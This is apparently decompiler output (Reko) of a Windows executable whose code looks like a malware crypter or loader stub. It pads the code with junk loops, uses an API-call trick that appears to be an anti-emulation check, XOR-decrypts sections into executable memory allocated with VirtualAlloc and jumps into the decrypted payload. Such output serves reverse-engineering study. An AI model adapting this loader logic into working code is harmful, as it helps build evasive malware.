// subject.c
// Generated by decompiling subject.exe
// using Reko decompiler version VERSION

#include "subject.h"

// 13101000: FlagGroup byte fn13101000(Register Eq_3 eax, Stack Eq_3 dwArg04, Stack Eq_5 dwArg08, Stack word32 dwArg0C, Stack (ptr32 word32) dwArg10, Stack Eq_8 dwArg14, Stack (arr Eq_223) dwArg18)
byte fn13101000(LPVOID eax, LPVOID dwArg04, LPVOID dwArg08, word32 dwArg0C, word32 * dwArg10, LPVOID dwArg14, Eq_223 dwArg18[])
{
	ui32 ebp_16 = (char *) eax + 0x00038884 ^ 0xF90A;
	do
		;
	while (ebp_16 == 0x00);
	ui32 ebp_41 = (char *) eax + 0x00038884 ^ 0xF90A;
	do
		;
	while (ebp_41 == 0x00);
	ui32 ebp_67 = (char *) eax + 0x00038884 ^ 0xF90A;
	do
		;
	while (ebp_67 == 0x00);
	ui32 ebp_92 = dwArg10 + 0x0000E221 ^ 0xF90A;
	do
		;
	while (ebp_92 == 0x00);
	ui32 ebp_119 = dwArg10 + 0x0000E221 ^ 0xF90A;
	do
		;
	while (ebp_119 == 0x00);
	*dwArg10 = dwArg0C;
	ui32 ebp_143 = dwArg10 + 0x0000E221 ^ 0xF90A;
	do
		;
	while (ebp_143 == 0x00);
	ui32 ebp_168 = (char *) dwArg14 + 0x00038884 ^ 0xF90A;
	do
		;
	while (ebp_168 == 0x00);
	ui32 ebp_197 = (char *) dwArg14 + 0x00038884 ^ 0xF90A;
	do
		;
	while (ebp_197 == 0x00);
	ui32 ebp_222 = (char *) dwArg14 + 0x00038884 ^ 0xF90A;
	do
		;
	while (ebp_222 == 0x00);
	uint64 edx_eax_230 = (uint64) (uint32) dwArg14;
	uint32 eax_240 = (uint32) (edx_eax_230 /u 0x05);
	word16 dx_239 = (word16) (uint32) (edx_eax_230 % 0x05);
	ui32 ebp_253 = eax_240 + 0x00038884 ^ 0xF90A;
	do
		;
	while (ebp_253 == 0x00);
	word16 wLoc0C_1050 = dx_239;
	ui32 ebp_277 = eax_240 + 0x00038884 ^ 0xF90A;
	do
		;
	while (ebp_277 == 0x00);
	ui32 ebp_304 = eax_240 + 0x00038884 ^ 0xF90A;
	do
		;
	while (ebp_304 == 0x00);
	word32 edx_318 = dwArg04 + dwArg14;
	ui32 ebp_332 = eax_240 + 0x00038884 ^ 0xF90A;
	do
		;
	while (ebp_332 == 0x00);
	byte * dwArg04_1190 = edx_318;
	ui32 ebp_356 = eax_240 + 0x00038884 ^ 0xF90A;
	do
		;
	while (ebp_356 == 0x00);
	while (true)
	{
		word32 ebp_403 = dwArg0C + 0x00038884;
		do
			;
		while ((ebp_403 ^ 0xF90A) == 0x00);
		ui32 ebp_430 = dwArg0C + 0x00038884 ^ 0xF90A;
		do
			;
		while (ebp_430 == 0x00);
		word32 ecx_444 = dwArg0C - 0x01;
		byte SCZO_447 = cond(ecx_444);
		ui32 ebp_458 = dwArg0C + 0x00038884 ^ 0xF90A;
		do
			;
		while (ebp_458 == 0x00);
		dwArg0C = ecx_444;
		ui32 ebp_482 = dwArg0C + 0x00038884 ^ 0xF90A;
		do
			;
		while (ebp_482 == 0x00);
		byte SCZDOP_498 = DPB(SCZO_447, false, 0);
		ui32 ebp_508 = dwArg0C + 0x00038884 ^ 0xF90A;
		do
			;
		while (ebp_508 == 0x00);
		if (true)
			break;
		ui32 ebp_617 = dwArg0C + 0x00038884 ^ 0xF90A;
		do
			;
		while (ebp_617 == 0x00);
		byte al_631 = *dwArg04_1190;
		word32 eax_632 = DPB(dwArg0C, al_631, 0);
		ui32 ebp_642 = eax_632 + 0x00038884 ^ 0xF90A;
		do
			;
		while (ebp_642 == 0x00);
		ui32 ebp_667 = eax_632 + 0x00038884 ^ 0xF90A;
		do
			;
		while (ebp_667 == 0x00);
		int32 ecx_681 = (int32) wLoc0C_1050;
		ui32 ebp_693 = eax_632 + 0x00038884 ^ 0xF90A;
		do
			;
		while (ebp_693 == 0x00);
		ui32 ebp_720 = eax_632 + 0x00038884 ^ 0xF90A;
		do
			;
		while (ebp_720 == 0x00);
		word32 eax_734 = (word32) (&(&(&(&(&(&(&(&(&(&(&(&(&(&(&(&(&(&(&dwArg18[ecx_681].a0000)[0x00].a0000)[0x00].a0000)[0x00].a0000)[0x00].a0000)[0x00].a0000)[0x00].a0000)[0x00].a0000)[0x00].a0000)[0x00].a0000)[0x00].a0000)[0x00].a0000)[0x00].a0000)[0x00].a0000)[0x00].a0000)[0x00].a0000)[0x00].a0000)[0x00].a0000)[0x00].a0000)[0x00];
		ui32 ebp_744 = eax_734 + 0x00038884 ^ 0xF90A;
		do
			;
		while (ebp_744 == 0x00);
		int32 ecx_758 = (int32) al_631;
		ui32 ebp_770 = eax_734 + 0x00038884 ^ 0xF90A;
		do
			;
		while (ebp_770 == 0x00);
		byte cl_785 = (byte) (ecx_758 ^ eax_734);
		ui32 ebp_799 = eax_734 + 0x00038884 ^ 0xF90A;
		do
			;
		while (ebp_799 == 0x00);
		ui32 ebp_823 = eax_734 + 0x00038884 ^ 0xF90A;
		do
			;
		while (ebp_823 == 0x00);
		ui32 ebp_849 = eax_734 + 0x00038884 ^ 0xF90A;
		do
			;
		while (ebp_849 == 0x00);
		word32 eax_864 = DPB(eax_734, cl_785, 0);
		ui32 ebp_875 = eax_864 + 0x00038884 ^ 0xF90A;
		do
			;
		while (ebp_875 == 0x00);
		*dwArg08 = (Eq_5) cl_785;
		ui32 ebp_900 = eax_864 + 0x00038884 ^ 0xF90A;
		do
			;
		while (ebp_900 == 0x00);
		ui32 ebp_926 = eax_864 + 0x00038884 ^ 0xF90A;
		do
			;
		while (ebp_926 == 0x00);
		word16 cx_940 = wLoc0C_1050 + 0x01;
		ui32 ebp_954 = eax_864 + 0x00038884 ^ 0xF90A;
		do
			;
		while (ebp_954 == 0x00);
		wLoc0C_1050 = cx_940;
		ui32 ebp_978 = eax_864 + 0x00038884 ^ 0xF90A;
		do
			;
		while (ebp_978 == 0x00);
		int32 edx_992 = (int32) cx_940;
		ui32 ebp_1004 = eax_864 + 0x00038884 ^ 0xF90A;
		do
			;
		while (ebp_1004 == 0x00);
		ui32 ebp_1029 = eax_864 + 0x00038884 ^ 0xF90A;
		do
			;
		while (ebp_1029 == 0x00);
		word32 eax_1036 = eax_864;
		if (edx_992 == 0x05)
		{
			do
				;
			while (225678 == 0x00);
			wLoc0C_1050 = 0x00;
			do
				;
			while (225678 == 0x00);
			eax_1036 = 0x00;
		}
		word32 ebp_1069 = eax_1036 + 0x00038884;
		do
			;
		while ((ebp_1069 ^ 0xF90A) == 0x00);
		Eq_5 ecx_1084 = (char *) dwArg08 + 0x01;
		word32 ebp_1097 = eax_1036 + 0x00038884;
		do
			;
		while ((ebp_1097 ^ 0xF90A) == 0x00);
		dwArg08 = ecx_1084;
		word32 ebp_1121 = eax_1036 + 0x00038884;
		do
			;
		while ((ebp_1121 ^ 0xF90A) == 0x00);
		word32 ebp_1147 = eax_1036 + 0x00038884;
		do
			;
		while ((ebp_1147 ^ 0xF90A) == 0x00);
		byte * edx_1162 = dwArg04_1190 + 0x01;
		word32 ebp_1175 = eax_1036 + 0x00038884;
		do
			;
		while ((ebp_1175 ^ 0xF90A) == 0x00);
		dwArg04_1190 = edx_1162;
		word32 ebp_1199 = eax_1036 + 0x00038884;
		do
			;
		while ((ebp_1199 ^ 0xF90A) == 0x00);
	}
	do
		;
	while (225679 == 0x00);
	do
		;
	while (225679 == 0x00);
	do
		;
	while (225679 == 0x00);
	return SCZDOP_498;
}

// 1310156E: Register Eq_385 Win32CrtStartup()
DWORD Win32CrtStartup()
{
	Eq_386 eax_17 = BindMoniker((IMoniker *) 0x000F0000, 0x1000, (IID *) 0x00090F7F, null);
	if (eax_17 == 0x80070057)
	{
		word32 ebp_132 = eax_17 + 0x00038884 ^ 0xF90A;
		do
			;
		while (ebp_132 == 0x00);
		word32 ebp_156 = eax_17 + 0x00038884 ^ 0xF90A;
		do
			;
		while (ebp_156 == 0x00);
		word32 ebp_180 = eax_17 + 0x00038884 ^ 0xF90A;
		do
			;
		while (ebp_180 == 0x00);
		word32 ebp_204 = eax_17 + 0x00038884 ^ 0xF90A;
		do
			;
		while (ebp_204 == 0x00);
		word32 ebp_228 = eax_17 + 0x00038884 ^ 0xF90A;
		do
			;
		while (ebp_228 == 0x00);
		word32 ebp_252 = eax_17 + 0x00038884 ^ 0xF90A;
		do
			;
		while (ebp_252 == 0x00);
		word32 ebp_276 = eax_17 + 0x00038884 ^ 0xF90A;
		do
			;
		while (ebp_276 == 0x00);
		do
			;
		while (0x131353DE == 0x00);
		word32 ecx_315 = globals->dw13102250;
		do
			;
		while (0x131353DE == 0x00);
		do
			;
		while (0x131353DE == 0x00);
		do
			;
		while (0x131353DE == 0x00);
		do
			;
		while (0x131353DE == 0x00);
		do
			;
		while (0x131353DE == 0x00);
		ui32 ebp_447 = fp + 0x00038874 ^ 0xF90A;
		do
			;
		while (ebp_447 == 0x00);
		ui32 ebp_472 = fp + 0x00038874 ^ 0xF90A;
		do
			;
		while (ebp_472 == 0x00);
		ui32 ebp_497 = fp + 0x00038874 ^ 0xF90A;
		do
			;
		while (ebp_497 == 0x00);
		ui32 ebp_521 = fp + 0x00038874 ^ 0xF90A;
		do
			;
		while (ebp_521 == 0x00);
		ui32 ebp_546 = fp + 0x00038874 ^ 0xF90A;
		do
			;
		while (ebp_546 == 0x00);
		ui32 ebp_570 = fp + 0x00038874 ^ 0xF90A;
		do
			;
		while (ebp_570 == 0x00);
		ui32 ebp_595 = fp + 0x00038874 ^ 0xF90A;
		do
			;
		while (ebp_595 == 0x00);
		fn13101000(fp - 0x10, fp - 0x28, fp - 0x28, 0x04, fp - 0x10, null, fp - 0x0234);
		do
			;
		while (225679 == 0x00);
		do
			;
		while (0x131353DE == 0x00);
		word32 ecx_659 = globals->dw13102254;
		do
			;
		while (0x131353DE == 0x00);
		fn13101000(fp - 0x10, fp - 0x025C, fp - 600, 0x04, fp - 0x10, (void *) 0x04, fp - 0x0234);
		ui32 v14_708 = globals->dw13102258;
		fn13101000(fp - 0x10, fp - 0x1C, fp - 0x14, 0x04, fp - 0x10, (void *) 0x08, fp - 0x0234);
		Eq_595 eax_743 = GetModuleHandleA(null);
		word32 eax_759 = globals->dw1310225C;
		fn13101000(fp - 0x10, fp - 0x28, fp - 0x1C, 0x04, fp - 0x10, (void *) 0x0C, fp - 0x0234);
		Eq_8 dwLoc0248_1055 = globals->t13102260;
		fn13101000(fp - 600, fp - 600, fp - 0x0248, 0x04, fp - 0x10, (void *) 0x10, fp - 0x0234);
		Eq_8 ecx_858 = v14_708 * 0x08 + 0x0C;
		Eq_8 dwLoc0250_1056 = (void *) 0x14;
		word32 * dwLoc24_1057 = &globals->dw13102264;
		Eq_5 eax_875 = VirtualAlloc(null, (char *) ecx_858 + ecx_659 + ecx_315, 0x3000, 0x40);
		word32 dwLoc0C_1058 = eax_759 + eax_743 + ecx_858;
		Eq_8 dwLoc0264_1059 = ecx_858;
		ui32 dwLoc08_1053 = 0x00;
		Eq_661 dwLoc18_1092 = null;
		while (0x01 != 0x00)
		{
			if (dwLoc0264_1059 == dwLoc0248_1055)
			{
				ui32 edx_1117 = dwLoc08_1053 + 0x01;
				dwLoc08_1053 = edx_1117;
				if (edx_1117 == v14_708)
					break;
				word32 edx_1134 = *dwLoc24_1057;
				fn13101000(fp - 0x1C, fp - 0x1C - dwLoc0250_1056, fp - 0x1C, 0x04, fp - 0x10, dwLoc0250_1056, fp - 0x0234);
				LPVOID * ecx_1180 = dwLoc24_1057 + 0x01;
				Eq_8 eax_1173 = (char *) dwLoc0250_1056 + 0x04;
				dwLoc0248_1055 = (Eq_8) *ecx_1180;
				fn13101000(fp - 0x10, fp - 0x0248 - eax_1173, fp - 0x0248, 0x04, fp - 0x10, eax_1173, fp - 0x0234);
				dwLoc0250_1056 = (Eq_8) ((char *) eax_1173 + 0x04);
				dwLoc24_1057 = (word32 *) ((char *) ecx_1180 + 0x04);
				dwLoc0264_1059 = null;
				dwLoc0C_1058 = (byte *) (eax_743 + edx_1134 / 0x04);
			}
			Mem1078[eax_875 + dwLoc18_1092:byte] = Mem0[dwLoc0C_1058 + 0x00:byte];
			dwLoc0C_1058 = dwLoc0C_1058 + 0x01;
			dwLoc18_1092 = dwLoc18_1092 + 0x01;
			dwLoc0264_1059 = (Eq_8) ((char *) dwLoc0264_1059 + 0x01);
		}
		Eq_3 eax_966 = eax_875 - ecx_858;
		byte DP_970 = fn13101000(eax_966, eax_966, eax_875, ecx_659, fp - 0x0238, ecx_858, fp - 0x0234);
		word32 esp_1025;
		word32 ebp_1026;
		byte SCZO_1027;
		word32 eax_1028;
		byte SZO_1029;
		bool C_1030;
		bool Z_1031;
		byte SCZDOP_1032;
		word32 ecx_1033;
		word32 edx_1034;
		byte dl_1035;
		byte DP_1036;
		(eax_875 + 0x0F50)();
		return 0x00;
	}
	else
	{
		<anonymous> * eax_72 = (GetACP() << 0x02) + 0x04001000;
		word32 esp_107;
		word32 ebp_108;
		byte SCZO_109;
		Eq_385 eax_110;
		byte SZO_111;
		bool C_112;
		bool Z_113;
		byte SCZDOP_114;
		word32 ecx_115;
		word32 edx_116;
		byte dl_117;
		byte DP_118;
		eax_72();
		return eax_110;
	}
}

